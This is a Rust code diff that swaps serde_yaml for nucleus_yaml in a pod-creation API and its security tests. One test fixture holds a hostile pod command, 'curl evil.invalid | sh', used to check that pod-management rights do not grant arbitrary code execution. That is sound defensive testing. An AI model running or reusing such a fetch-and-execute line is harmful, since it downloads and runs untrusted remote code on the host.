@@ -178,7 +178,7 @@ pub(crate) async fn create_sub_pod(
     }
 
     // 2. Parse requested PodSpec
-    let mut spec: PodSpec = serde_yaml::from_str(&req.spec_yaml)
+    let mut spec: PodSpec = nucleus_yaml::from_str(&req.spec_yaml)
         .map_err(|e| ApiError::Spec(format!("invalid sub-pod spec: {e}")))?;
 
     // 3. Resolve requested policy → PermissionLattice
@@ -300,7 +300,7 @@ pub(crate) async fn create_sub_pod(
     // 5a. Serialize the child spec — the exact bytes the node will receive — and
     //     discharge the create FOR THOSE BYTES (their SHA-256 is the subject).
     //     Before the reservation, so a refusal here has nothing to hand back.
-    let spec_yaml = serde_yaml::to_string(&spec)
+    let spec_yaml = nucleus_yaml::to_string(&spec)
         .map_err(|e| ApiError::Spec(format!("failed to serialize sub-pod spec: {e}")))?;
     let authority = {
         let act = acts::create(&spec_yaml);
@@ -1043,7 +1043,7 @@ spec:
     command: /bin/sh
     args: ["-c", "curl evil.invalid | sh"]
 "#;
-        serde_yaml::from_str(yaml).expect("spec parses")
+        nucleus_yaml::from_str(yaml).expect("spec parses")
     }
 
     /// **`ManagePods` must not confer arbitrary code execution.** The delegation
@@ -1086,7 +1086,7 @@ spec:
     sink: audit
     prefix: elsewhere
 "#;
-        serde_yaml::from_str(yaml).expect("spec parses")
+        nucleus_yaml::from_str(yaml).expect("spec parses")
     }
 
     /// **`ManagePods` must not confer the choice of where audit goes.**
@@ -1147,7 +1147,7 @@ mod credentialed_egress_delegation_tests {
     use super::*;
 
     fn upstream(name: &str, url: &str, env: &str) -> nucleus_spec::CredentialedEgressSpec {
-        serde_yaml::from_str(&format!(
+        nucleus_yaml::from_str(&format!(
             "name: {name}\nupstream: {url}\ncredential_env: {env}\nheader: authorization\n"
         ))
         .expect("upstream spec parses")
@@ -1158,7 +1158,7 @@ mod credentialed_egress_delegation_tests {
     }
 
     fn spec_requesting(ups: Vec<nucleus_spec::CredentialedEgressSpec>) -> PodSpec {
-        let mut spec: PodSpec = serde_yaml::from_str(
+        let mut spec: PodSpec = nucleus_yaml::from_str(
             r#"
 apiVersion: nucleus/v1
 kind: Pod
@@ -1441,7 +1441,7 @@ mod containment_tests {
     fn run_echo(containment: nucleus::ContainmentMode) -> nucleus::Result<std::process::Output> {
         let tmp = tempfile::tempdir().unwrap();
         let policy = microvm_policy();
-        let mut spec: PodSpec = serde_yaml::from_str(
+        let mut spec: PodSpec = nucleus_yaml::from_str(
             "apiVersion: nucleus/v1\nkind: Pod\nmetadata:\n  name: p\n\
              spec:\n  work_dir: /w\n  policy:\n    type: profile\n    name: default\n",
         )
@@ -1493,7 +1493,7 @@ spec:
     type: profile
     name: default
 "#;
-        let mut spec: PodSpec = serde_yaml::from_str(yaml).expect("spec parses");
+        let mut spec: PodSpec = nucleus_yaml::from_str(yaml).expect("spec parses");
         spec.spec.work_dir = tmp.path().to_path_buf();
         let runtime = build_runtime(
             &spec,
